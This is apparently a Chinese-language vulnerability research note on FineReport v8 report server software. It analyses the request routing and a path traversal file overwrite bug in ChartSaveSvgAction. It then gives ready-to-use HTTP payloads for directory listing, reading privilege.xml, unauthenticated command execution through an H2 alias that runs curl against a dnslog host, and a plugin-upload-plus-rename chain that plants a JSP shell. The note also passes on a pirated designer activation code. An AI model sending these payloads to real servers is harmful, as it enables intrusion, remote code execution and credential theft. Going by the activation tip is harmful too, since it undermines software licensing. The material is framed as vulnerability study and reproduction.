# FineReport

官方文档： https://www.finereport.com/

官方帮助文档： https://help.finereport.com/

FineReport（帆软报表）的安装较为简单，直接双击`windows_x64_FineReport-CN.exe`，选择好安装目录后自动安装，安装完成后，自动跳转到`http://localhost:8075/WebReport/ReportServer`数据决策系统，第一次使用要求先配置管理员用户名和密码。

如果要使用设计器，可以从网上找一个激活码（如`设计器激活码：63e70b50-36c054361-9578-69936c1e9a57`），点击激活即可

## 架构分析
### 路由分析
`/WebReport/WEB-INF/web.xml`是唯一的路由配置文件，并且只定义了一个servlet，内容如下
```xml
  <servlet>
    <servlet-name>ReportServer</servlet-name>
    <servlet-class>com.fr.web.ReportServlet</servlet-class>
    <load-on-startup>0</load-on-startup>
  </servlet>

  <servlet-mapping>
    <servlet-name>ReportServer</servlet-name>
    <url-pattern>/ReportServer</url-pattern>
  </servlet-mapping>
```
ReportServlet本身包括init、destroy、createLegalModuleClassName方法，但是createLegalModuleClassName方法并不对请求进行处理。作为请求的入口类，理论上存在请求处理或参数传递，所以直接看ReportServlet的父类BaseServlet。它实现了HttpServlet，具备doGet和doPost等方法（doPost调用的也是doGet）。
<details>
    <summary>BaseServlet</summary>
    <pre>
    <code>
public abstract class BaseServlet extends HttpServlet {
    ...
    public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws IOException, ServletException {
        this.initWebAppName(var1);
        saveRequestContext(var1);
        GZIPResponseWrapper var3 = null;
        try {
            String var4 = var1.getHeader("accept-encoding");
            var3 = this.initGzipResponseWrapper(var1, (HttpServletResponse)var2, var4);
            if (var3 != null) {
                var2 = var3;
            }
            ((HttpServletResponse)var2).addHeader("P3P", "CP=CAO PSA OUR");
            ExtraClassManagerProvider var5 = (ExtraClassManagerProvider)PluginModule.getAgent(PluginModule.ExtraCore);
            if (var5 != null) {
                Set var6 = var5.getArray("SessionPrivilegeFilterProvider");
                Iterator var7 = var6.iterator();
                while(var7.hasNext()) {
                    SessionPrivilegeFilterProvider var8 = (SessionPrivilegeFilterProvider)var7.next();
                    var8.addSecurityResponseHeader((HttpServletResponse)var2);
                }
            }
            ReportDispatcher.dealWithRequest(var1, (HttpServletResponse)var2);
        } ...
    }
}
    </code>
    </pre>
</details>

请求处理的核心方法`dealWithRequest`代码如下，获取op参数根据op参数调用不同方法，大多最后会调用`dealWithOp`方法
```java
public static void dealWithRequest(HttpServletRequest var0, HttpServletResponse var1) throws Exception {
        extraFilter(var0, var1);
        String var2 = WebUtils.getHTTPRequestParameter(var0, "op");
        String var3 = WebUtils.getHTTPRequestParameter(var0, "sessionID");
        if (!ClusterHelperFactory.getProvider().isUseCluster() || !ClusterHelperFactory.getProvider().CheckClusterDispatch(var0, var1, var2, var3)) {
            if (RestartReminder.getInstance().isIntercept(var2)) { ...
            } else if ("closesessionid".equalsIgnoreCase(var2) && var3 != null) {...
            } else {
                ...
                if ("getSessionID".equalsIgnoreCase(var2)) {...
                } else if (var3 != null && !SessionDealWith.hasSessionID(var3)) {
                    SessionDealWith.writeSessionTimeout(var0, var1);
                } else if (!ClusterHelperFactory.getProvider().isUseCluster() || !ClusterHelperFactory.getProvider().CheckClusterDispatch(var0, var1, var2, var3)) {
                    if (!MemoryHelper.getMemoryAlarmProcessor().doSessionCheck(var0, var1)) {
                        dealWeblet(var2, var3, var0, var1); // 最终调用dealWithOp方法
                    }...
    }
```
dealWithOp方法根据传入的op，如果能在extraServices找到对应的就直接处理，否则就从现有的Services中，获取actionOP，然后进一步处理请求
```java
private static void dealWithOp(String var0, String var1, HttpServletRequest var2, HttpServletResponse var3) throws Exception {
        var0 = var0.toLowerCase();
        var2.setAttribute("op", var0);
        ...
        Service var12;
        synchronized(EXTRA_SERVICES_LOCK) {
            var12 = (Service)extraServices.get(var0.toLowerCase());
        }
        if (var12 != null) {
            var12.process(var2, var3, var0, var1);
        } else {
            Service[] var13 = servicesAvailable;
            int var15 = var13.length;

            for(int var8 = 0; var8 < var15; ++var8) {
                Service var9 = var13[var8];
                String var10 = var9.actionOP();
                if (var0.equalsIgnoreCase(var10)) {
                    var9.process(var2, var3, var0, var1);
                    return;
                }
            }
            ...
```
如果查看service接口，会发现确实分为了actionOP和process两种方式。
```java
public interface Service {
    String XML_TAG = "WebService";

    String actionOP();

    void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception;
}
```
后续的执行流程，可参考 - [任意文件覆盖漏洞](#任意文件覆盖漏洞)

## 历史漏洞

历史漏洞复现时要注意一些问题 （1）一般的访问根路径为`http://ip:8075/WebReport/ReportServer`，有的则直接是`http://ip:8075/ReportServer`，或者端口可能也不固定。（2）同样是v8版本，但可能不同小版本之间有很多类存在差异。

|漏洞名称|访问路径|影响版本|
|:---:|:---:|:---:|
|目录漏洞|`op=fs_remote_design&cmd=design_list_file&file_path=../`|v8|
|任意文件读取漏洞|`op=chart&cmd=get_geo_json&resourcepath=privilege.xml`|v8|
|未授权命令执行漏洞|`op=fr_log&cmd=fg_errinfo&fr_username=admin`|——|
|文件上传漏洞|上传`op=plugin&cmd=local_install`, 移动`op=fr_server&cmd=manual_backup`|v8|

### 任意文件覆盖漏洞
漏洞入口类为`ChartSvgInitService`。先获取op，然后执行Service的process方法
```
public class ChartSvgInitService implements Service {
    // 这些actions由此Service处理
    private RequestCMDReceiver[] actions = new RequestCMDReceiver[]{new ChartGetSvgAction(), new ChartSaveSvgAction(), new ChartDeleteSvgAction()};

    public String actionOP() {
        return "svginit";
    }

    public void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception {
        WebActionsDispatcher.dealForActionCMD(var1, var2, var4, this.actions); // 最终调用的核心方法是WebActionsDispatcher.dealForActionCMD()
    }
}
```
dealForActionCMD方法代码如下，先调用某个action的getCMD方法，如果获取到的字符串值和cmd传入的参数一样，就调用该action的actionCMD方法
```java
public static void dealForActionCMD(HttpServletRequest var0, HttpServletResponse var1, String var2, RequestCMDReceiver[] var3, String var4) throws Exception {
        String var5 = WebUtils.getHTTPRequestParameter(var0, "op");
        String var6 = WebUtils.getHTTPRequestParameter(var0, "pid");
        ExtraClassManagerProvider var7 = (ExtraClassManagerProvider)PluginModule.getAgent(PluginModule.ExtraCore);
        RequestCMDReceiver var8 = null;
        if (var7 != null) {
            var8 = var7.getActionCMD(var5, var4, var6);
        }

        if (var8 != null) {
            var8.actionCMD(var0, var1, var2);
        } else {
            RequestCMDReceiver[] var9 = var3;
            int var10 = var3.length;

            for(int var11 = 0; var11 < var10; ++var11) {
                RequestCMDReceiver var12 = var9[var11];
                String var13 = var12.getCMD(); // 
                if (var13.equalsIgnoreCase(var4)) { // var4对应的是WebUtils.getHTTPRequestParameter(var0, "cmd");
                    var12.actionCMD(var0, var1, var2);
                    return;
                }
            }
        }
    }
```
ChartSvgInitService对应的action包括：`ChartGetSvgAction、ChartSaveSvgAction、ChartDeleteSvgAction`。漏洞位于`ChartSaveSvgAction`，其actionCMD方法如下
```java
    public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception {
        String var4 = WebUtils.getHTTPRequestParameter(var1, "filePath");
        String var5 = GeneralContext.getEnvProvider().getPath() + "/" + "assets" + "/";
        var4 = var5 + var4.substring(var4.indexOf("chartmapsvg"));
        File var6 = null;
        if (var4.contains(".svg")) {
            var6 = new File(var4.substring(0, var4.lastIndexOf("/")));
        } else {
            var6 = new File(var4);
        }

        if (!var6.exists()) {
            var6.mkdirs();
        }

        InputStream var7 = HttpClient.getInputStream(var1);
        if (var7 != null) {
            FileOutputStream var8 = new FileOutputStream(var4);
            Utils.copyBinaryTo(var7, var8);
            String[] var9 = StableUtils.pathSplit(var4);
            String var10 = StableUtils.getFileNameWithOutPostfix(var9[var9.length - 1]);
            MapSvgXMLHelper.getInstance().pushMapAttr(var10, new MapSvgAttr(var4));
            var8.flush();
            var7.close();
            var8.close();
        }
    }
```
假如传入filePath的形式如：`filePath=chartmapsvg/../../../xxx.jsp`，那么会截取chartmapsvg后的内容拼接到`/WebReport/WEB-INF/assets/`之后。然后获取数据流var1中的内容，复制给拼接后的路径文件。获取数据流的内容是从`__CONTENT__`中获取

```java
public static InputStream getInputStream(HttpServletRequest var0) {
    ByteArrayInputStream var1 = null;
    String var2 = (String)var0.getAttribute("__CONTENT__");
    Object var3 = var0.getAttribute("__CHARSET__");
    String var4 = var3 == null ? "UTF-8" : var3.toString();
    if (StringUtils.isNotEmpty(var2)) {
        byte[] var5;
        try {
            var5 = var2.getBytes(var4);
        } ...
        var1 = new ByteArrayInputStream(var5);
    }
    return var1;
}
```


### 目录遍历漏洞
```
http://localhost:8075/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../&currentUserName=admin&currentUserId=1&isWebReport=true
```
页面上会列出当前目录下的文件

### 任意文件读取漏洞
```
http://localhost:8075/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

### 未授权命令执行漏洞
```
POST /WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 675

__parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl http://hfgzn5.dnslog.cn');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
```

### 文件上传漏洞
插件上传的漏洞文件位于fr-platform-8.0.jar包中的com.fr.fs.plugin.op.web.action.InstallFromDiskAction
```
POST /WebReport/ReportServer?op=plugin&cmd=local_install HTTP/1.1
Host: 10.92.64.169:8075
Content-Length: 226
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9ZPGwpk0bLORZAro
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=53F74B74ECF933876F24232796688180; fr_remember=false; fr_password=; fr_username=erick
Connection: close

------WebKitFormBoundary9ZPGwpk0bLORZAro
Content-Disposition: form-data; name="install-from-disk"; filename="shell.zip"
Content-Type: application/zip

<%
    out.print("1");
%>
------WebKitFormBoundary9ZPGwpk0bLORZAro--
```
将 WEB-INF/upload/local_temp.zip 文件移动到 web 目录下，在ServerConfigManualBackupAction 类的 actionCMD 方法中，
```
POST /WebReport/ReportServer?op=fr_server&cmd=manual_backup HTTP/1.1
Host: 0.0.0.0:8080
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=12wuh1def7w85; fr_password=; fr_remember=false
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

optype=edit_backup&oldname=../../../WEB-INF/upload/local_temp.zip&newname=../../../shel.jsp&serverID=
```
